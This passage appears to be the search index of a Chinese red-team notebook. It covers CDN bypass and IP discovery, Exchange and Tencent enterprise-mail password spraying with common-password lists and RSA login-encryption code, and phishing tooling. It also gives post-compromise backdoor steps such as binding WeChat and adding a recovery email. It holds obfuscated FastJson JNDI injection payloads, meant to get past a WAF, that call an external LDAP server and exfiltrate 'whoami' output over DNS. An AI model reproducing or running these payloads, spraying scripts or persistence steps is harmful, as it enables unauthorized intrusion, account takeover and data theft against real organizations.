http://toolbar.netcraft.com/site_report?url= https://viewdns.info/iphistory/?domain= 06 SSL证书 在线查询 查询网址 https://search.censys.io/certificates?q= 查询语法 parsed.names.raw: \"baidu.cn\" and tags.raw: trusted # 测试过程中，很容易陷入思维误区，认为 有效 的证书才是我们需要的，但其实并不一定，很多服务器配置错误依然保留的是 无效 的证书 parsed.names.raw: \"baidu.cn\" 关联更多的域名与ip 查询证书的详情 https://crt.sh/ 输入值sha-1或者sha-256 命令行查询 openssl openssl s_client -connect www.tesla.com:443 | grep subject curl curl -v https://www.tesla.com:443 | grep 'subject' 07 敏感文件泄露 服务器日志文件 探针文件，例如 phpinfo 网站备份压缩文件 .DS_Store .hg .git SVN Web.xml 08 历史域名 很多网站在发展的过程中，会更换域名，比如京东以前的域名是 360buy.com ，后来斥巨资购买了 jd.com 。 网站在更换新域名时，如果将 CDN 部署到新的域名上，而之前的域名由于没过期，可能未使用 CDN，因此可以直接获得服务器 IP，所以，历史域名也是一个很重要的点。 09 WordPress通过 XML-RPC PINGBACK 通信 XML-RPC 是支持 WordPress 与其他系统之间通信的规范，它通过使用 HTTP 作为传输机制和 XML 作为编码机制来标准化这些通信过程。 在 WordPress 的早期版本中，默认情况下已关闭 XML-RPC，但是从3.5版本开始，默认情况下开启。 XML-RPC 支持 trackback 和 pingback。 虽然 WordPress 启用了 REST API 来代替 XML-RPC ，不过 XML-RPX 不会过时的，放心大胆的使用就好，虽然 XML-RPC 这个技术很老了，但依然可以通杀很多网站。 POST /xmlrpc.php HTTP/1.1 Host: domain.com Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en,zh-CN;q=0.9,zh;q=0.8 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 323 pingback.ping http://2vbis4.dnslog.cn https://domain.com/ 10 APP 目标若存在APP，则APP可能通过IP直接与服务端进行通信，若最新版采用域名通信，也可尝试寻找历史版本进行分析。 11 漏洞 如果目标网站本身存在漏洞的话，比如 SSRF、XXE、XSS、文件上传、命令执行等漏洞，或者我们找到的其他突破口，注入我们自己的带外服务器地址，然后在服务器上检查 HTTP 日志记录。 应用本身的错误会造成当传递一些错误的参数值或者错误的地址时，内部会抛出异常，也就是日常所说的报错，关注报错点，经常会泄露一些真实的 IP 地址或者内网 IP 段。 12 host碰撞 当我们收集到大量IP资产，明明开了WEB端口，但直接请求通常会是 4XX 5XX，究其原因，大部分是因为中间件对直接IP访问进行了限制，必须使用域名访问。这些资产大部分是内部员工使用的系统，使用外网IP，但是绑定的域名是内部域名，外网DNS服务器无法解析，必须本地hosts文件写入绑定关系，才可正常使用内部域名访问。 首先利用收集到的域名和ip进行碰撞 https://github.com/fofapro/Hosts_scan 然后进行目录扫描 ffuf -w /path/to/wordlist -u https://target/FUZZ ffuf -w /path/to/vhost/wordlist -u https://target -H \"Host: FUZZ\" -fs 4242 ffuf -w /path/to/wordlist -u https://target/FUZZ -maxtime 60 13 通过域名备案信息广域探测（成功率高） 针对目标域名，目标二级域名，如果都做了 CDN 的情况下，是不是就思路中断了呢？ 肯定不是。这里分享一个很少有人去关注的独门秘技。 网站需要服务器，但是再土豪的公司，也不可能一个域名一台服务器，大多数情况下，都是多个域名业务，共用一台服务器。 那么如果目标网站存在备案，可以查询其备案信息，收集该单位或者个人备案的其他网站域名以及其他子域，然后再进行一轮广域的探测，很有可能其中的某个边缘子域，没有做 CDN，就直接暴露了真实服务器的 IP 地址，然后再进一步验证该 IP 是否也是目标网站的真实 IP 。 14 找到真实IP之后如何使用 在获取到真实IP后，通过直接访问IP可能无法访问，那么此时提供2种思路进行解决 通过修改 hosts 文件，将域名和 IP 绑定。（要是不会，不建议阅读此文。） 如使用 burpsuite 测试，可以在 Project options ----> Connections ----> Hostname Resolution 中增加域名和 IP 记录。 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-14 18:27:51 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/4.IP段收集/02IP段查询.html":{"url":"红蓝对抗/01.打点/01.信息收集/4.IP段收集/02IP段查询.html","title":"02IP段查询","keywords":"","body":"有时候，目标如果比较大，可以通过ipwhois.cnnic.net.cn来查看运营商给他们分配的IP段，然后再对这些段进行测试即可。 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-15 10:51:52 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/02.WEB漏洞/":{"url":"红蓝对抗/01.打点/02.WEB漏洞/","title":"02.WEB漏洞","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/02.WEB漏洞/Exchange/exchange爆破.html":{"url":"红蓝对抗/01.打点/02.WEB漏洞/Exchange/exchange爆破.html","title":"exchange爆破","keywords":"","body":"0x01 Exchange爆破 项目中碰到exchange除了漏洞利用还可以进行爆破，每半个小时可以爆破三次 0x02 常用口令 1qaz@WSX 目标域名@年份 目标域名#年份 Passw@rd Passw0rd1 P@ssw0rd 0x03爆破工具 https://www.anquanke.com/post/id/226543#h3-6 https://github.com/grayddq/EBurst 带客人yyds Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-05 14:54:49 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/02.WEB漏洞/FastJson/绕过创宇盾.html":{"url":"红蓝对抗/01.打点/02.WEB漏洞/FastJson/绕过创宇盾.html","title":"绕过创宇盾","keywords":"","body":"{\"name\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\",\"\\u0076\\u0061\\u006c\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"},\"x\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"ldap://159.75.34.78:1389/Basic/Command/Base64/\",\"autoCommit\":true}} ldap\\x3a\\x2f\\x2f159\\x2e75\\x2e34\\x2e78\\x3a1389/Basic/Command/Base64/ {zeo:{,,,,,,,,,,,,,,,,,,,,,,,,,,,,\"@\\x74ype\":\"java\\x2enet\\x2eInet4Address\"/*&(*^&%^%(*&*^%^&^&^&^*(&*(&^^^***&*&&*&*&&*/,\"val\":\"fnam`whoami`ec\\x2e2db70b25\\x2etu4\\x2eorg\"}} {\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://:1389/Basic/Command/Base64/\",\"autoCommit\":true}} {zeo:{,,,,,,,,,,,,,,,,,,,,,,,,,,,,\"\\u0040\\x74\\u0079pe\":\"java\\x2elang\\x2eClass\"/*&(*^&%^%(*&*^%^&^&^&^*(&*(&^^^***&*&&*&*&&*/,\"val\":\"com\\x2esun\\x2erowset\\x2eJdbcRowSetImpl\"},zeo:{,,,,,,,,,,,,,,,,,,,,,,,,,,,,\"\\u0040\\x74\\u0079pe\":\"com\\x2esun\\x2erowset\\x2eJdbcRowSetImpl\"/*&(*^&%^%(*&*^%^&^&^&^*(&*(&^^^***&*&&*&*&&*/,\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"11ff\\x2namec\\x2e2db70b25\\x2e\"/*&(*^&%^%(*&*^%^&^&^&^*(&*(&^^^***&*&&*&*&&*/}} {zeo2:{,,,,,,,,,,,,,,,,,,,,,,,,,,,,\"\\u0040\\x74\\u0079pe\":\"java\\x2elang\\x2eClass\"/*&(*^&%^%(*&*^%^&^&^&^*(&*(&^^^***&*&&*&*&&*/,\"val\":\"com\\x2esun\\x2erowset\\x2eJdbcRowSetImpl\"},zeo:{,,,,,,,,,,,,,,,,,,,,,,,,,,,,\"\\u0040\\x74\\u0079pe\":\"java\\x2enet\\x2eInet4Address\"/*&(*^&%^%(*&*^%^&^&^&^*(&*(&^^^***&*&&*&*&&*/,\"val\":\"fnam`whoami`ec\\x2e2db70b25\\x2e\"}} Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-14 17:27:04 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/03.APP渗透相关/":{"url":"红蓝对抗/01.打点/03.APP渗透相关/","title":"03.APP渗透相关","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/04.小程序渗透相关/":{"url":"红蓝对抗/01.打点/04.小程序渗透相关/","title":"04.小程序渗透相关","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/05.钓鱼相关/":{"url":"红蓝对抗/01.打点/05.钓鱼相关/","title":"05.钓鱼相关","keywords":"","body":"钓鱼红队基础设施搭建 1、CS搭建、隐藏、CDN、养域名....2、鱼叉钓鱼：邮箱信息收集3、水坑钓鱼：XSS挖掘、JS模板4、IM钓鱼：话术准备 5、网页克隆钓鱼：一键化工具测试 6、免杀样本准备： CVE-2022-30190 CVE-2018-4878 CVE-2017-11882 CVE-2022-0337 lnk样本 7、工具免杀准备 fscan等内网扫描工具 frp等隧道代理工具 mimikatz等内网横向工具 钓鱼工具推荐 https://github.com/gophish/gophish：可以克隆网页，编写钓鱼邮件，还可以 导入模板，能追踪受害者的状态，如是否点击和输入内容，以及后续的cookie。 https://github.com/Raikia/FiercePhish：制作钓鱼邮件、编写模板，能快速 导入导出。 https://github.com/GemGeorge/SniperPhish：制作钓鱼网站和钓鱼网页，追 踪受害者动态、支持嵌入二维码，自动重命名附件，是个非常强大的工具，五星好评 https://github.com/makdosx/mip22：多达69个模板，自动缩短钓鱼url，自动 内网穿透。 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-01 10:40:00 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/05.钓鱼相关/邮箱钓鱼/邮箱钓鱼.html":{"url":"红蓝对抗/01.打点/05.钓鱼相关/邮箱钓鱼/邮箱钓鱼.html","title":"邮箱钓鱼","keywords":"","body":"邮件钓鱼 参考 钓鱼邮件模板：https://github.com/SimplySecurity/SimplyTemplate 钓鱼邮件模板：https://github.com/criggs626/PhishingTemplates 钓鱼邮件工具：https://github.com/xHak9x/SocialPhish 如何伪造一封合格的钓鱼邮件：https://blog.csdn.net/yiifaa/article/details/78471241 记一次真实的邮件钓鱼演练：https://xz.aliyun.com/t/5412 记一次企业安全意识宣传活动-钓鱼邮件：https://www.freebuf.com/column/154460.html 钓鱼邮件攻击防范指南：https://cloud.tencent.com/devel 写的比较好的 https://moshou.org.cn/index.php/archives/5/ 邮件伪造之SPF绕过的5种思路 https://mp.weixin.qq.com/s/dqntjRLgcOD3D2bi1oDFAw Swaks伪造邮件 https://payloads.online/archivers/2019-05-09/1/ Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-14 14:35:36 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/06.WAF绕过/":{"url":"红蓝对抗/01.打点/06.WAF绕过/","title":"06.WAF绕过","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/07.思路技巧/":{"url":"红蓝对抗/01.打点/07.思路技巧/","title":"07.思路技巧","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/08.其他与打点相关/":{"url":"红蓝对抗/01.打点/08.其他与打点相关/","title":"08.其他与打点相关","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/08.其他与打点相关/TX企业邮箱爆破.html":{"url":"红蓝对抗/01.打点/08.其他与打点相关/TX企业邮箱爆破.html","title":"TX企业邮箱爆破","keywords":"","body":"0x01 前言 漏洞打点越来越难，最近整起了邮箱钓鱼，自建MX Server搭配GoFish可以满足大部分，提前养好域名也能投递到目标非垃圾箱邮箱，但是有一个内部邮箱才是一个神挡杀神的存在，分析了腾讯企业邮箱的登录逻辑，企业邮箱对POP3和SMTP的登录做了限制，只有绑定了微信登录并且开启了安全码（16位数字加大小写字母）才允许通过995、465端口进行认证登录，16位随机字符串基本排除爆破的可能。因此研究了前端web的登录逻辑，简单写了个单线程密码喷洒的脚本，自测效果还不错（尤其是内网DMZ打完。密码收集完，突破到办公系统）。 0x02 前台加密分析 TX企业邮箱Web端登录前台会对传入的数据进行RSA加密，加密代码 var PublicKey = \"CF87D7B4C864F4842F1D337491A48FFF54B73A17300E8E42FA365420393AC0346AE55D8AFAD975DFA175FAF0106CBA81AF1DDE4ACEC284DAC6ED9A0D8FEB1CC070733C58213EFFED46529C54CEA06D774E3CC7E073346AEBD6C66FC973F299EB74738E400B22B1E7CDC54E71AED059D228DFEB5B29C530FF341502AE56DDCFE9\"; var RSA = new RSAKey(); RSA.setPublic(PublicKey, \"10001\"); var PublicTs=\"1657285628\"; var Res = RSA.encrypt(document.form1.pp.value + '\\n' + document.form1.ts.value + '\\n'); if (Res ) { if (document.form1.chg.value == 1) { document.form1.p.value = hex2b64(Res); } else { if (document.form1.ppp.value != \"\") { document.form1.p.value = document.form1.ppp.value; } else { document.form1.p.value = hex2b64(Res); } } 不懂RSA，简单谷歌了下，这个PublicKey是rsa的模量，10001是指数，可以使用模量和指数生成公钥，然后利用公钥进行加密，找了下网上公开的算法，找到了python2和python3两个版本的实现方法，这里统一留存下 python2 import sys from binascii import a2b_hex, b2a_hex from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 from Crypto.Util.number import bytes_to_long def encrypt_with_modulus(content, modulus=None): e = long(0x10001) n = bytes_to_long(a2b_hex(modulus)) rsa_key = RSA.construct((n, e)) # generate/export public key public_key = rsa_key.publickey() print(dir(public_key)) print(dir(public_key.exportKey)) print(public_key.exportKey.im_self) cipher = PKCS1_v1_5.new(public_key) # print(dir(cipher)) content = cipher.encrypt(content) content = b2a_hex(content) return str(content) result = encrypt_with_modulus(\"123456\\n1657284648\\n\",\"CF87D7B4C864F4842F1D337491A48FFF54B73A17300E8E42FA365420393AC0346AE55D8AFAD975DFA175FAF0106CBA81AF1DDE4ACEC284DAC6ED9A0D8FEB1CC070733C58213EFFED46529C54CEA06D774E3CC7E073346AEBD6C66FC973F299EB74738E400B22B1E7CDC54E71AED059D228DFEB5B29C530FF341502AE56DDCFE9\") print(result) python3 def encrypt_with_modulus(e,n,content): \"\"\" 根据 模量与指数 生成公钥，并利用公钥对内容 rsa 加密返回结果 :param e:指数 :param m: 模量 :param content:待加密字符串 :return: 加密后结果 \"\"\" e = int(e, 16) m = int(n, 16) pub_key = rsa.PublicKey(e=e, n=n) m = rsa.encrypt(content.encode(),pub_key) print(m.hex()) return m.hex() if __name__ == '__main__': m = \"CF87D7B4C864F4842F1D337491A48FFF54B73A17300E8E42FA365420393AC0346AE55D8AFAD975DFA175FAF0106CBA81AF1DDE4ACEC284DAC6ED9A0D8FEB1CC070733C58213EFFED46529C54CEA06D774E3CC7E073346AEBD6C66FC973F299EB74738E400B22B1E7CDC54E71AED059D228DFEB5B29C530FF341502AE56DDCFE9\" e = \"10001\" con = '123456\\n1657284648\\n' encrypt_with_modulus(e=e, m=m, content=con) WEB端对passwd\\ntimestamp\\n这个串进行RSA加密，企业邮对同一账户的登录次数做了限制，大概测了下，10分钟内错误三次就会触发验证码机制，所以在收集到目标准确密码本之后，可以邮箱进行密码喷洒。 0x03 爆破脚本使用 地址： https://github.com/R1card0-tutu/MailDOG 命令: python3 MailDOG.py --domain=\"exmail.qq.com\" --mailadd=\"main.txt\" --passwd=\"1qaz@WSX\" run 0x04 后利用 在拿到邮箱之后 01 绑定微信 如果目标账号没有绑定微信，可以直接扫码绑定微信，没有二次验证 02 安全码 生成16位安全码，可以使用POP和IMAP进行收发信操作。注意端口号，失败可以尝试下SSL端口。 03 密保邮箱 上面两个操作基本就是一锤子买卖，用完账号基本也就凉了。当目标没有绑定手机号时，可以在账户 > 账户安全 > 设置密保邮箱，作为一个后门留存。 0x05 企业邮安全 自查邮箱账户的0x03的三项。 排查用户的常见口令 1qaz@WSX 目标域名@年份 目标域名#年份 Passw@rd Passw0rd1 P@ssw0rd Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-09 08:15:19 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/01.Webshell/":{"url":"红蓝对抗/02.后渗透/01.Webshell/","title":"01.Webshell","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/02.提权/":{"url":"红蓝对抗/02.后渗透/02.提权/","title":"02.提权","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/03.代理/":{"url":"红蓝对抗/02.后渗透/03.代理/","title":"03.代理","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/04.免杀/":{"url":"红蓝对抗/02.后渗透/04.免杀/","title":"04.免杀","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/05.C2.CC/":{"url":"红蓝对抗/02.后渗透/05.C2.CC/","title":"05.C2.CC","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/06.权限维持/":{"url":"红蓝对抗/02.后渗透/06.权限维持/","title":"06.权限维持","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/07.横向/":{"url":"红蓝对抗/02.后渗透/07.横向/","title":"07.横向","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/08.域渗透/":{"url":"红蓝对抗/02.后渗透/08.域渗透/","title":"08.域渗透","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/09.痕迹清理/":{"url":"红蓝对抗/02.后渗透/09.痕迹清理/","title":"09.痕迹清理","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/10.思路技巧总结/":{"url":"红蓝对抗/02.后渗透/10.思路技巧总结/","title":"10.思路技巧总结","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/11.其他与后渗透相关/":{"url":"红蓝对抗/02.后渗透/11.其他与后渗透相关/","title":"11.其他与后渗透相关","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/03.威胁情报/":{"url":"红蓝对抗/03.威胁情报/","title":"03.威胁情报","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/04.应急溯源/":{"url":"红蓝对抗/04.应急溯源/","title":"04.应急溯源","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/05.APT分析报告/":{"url":"红蓝对抗/05.APT分析报告/","title":"05.APT分析报告","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) 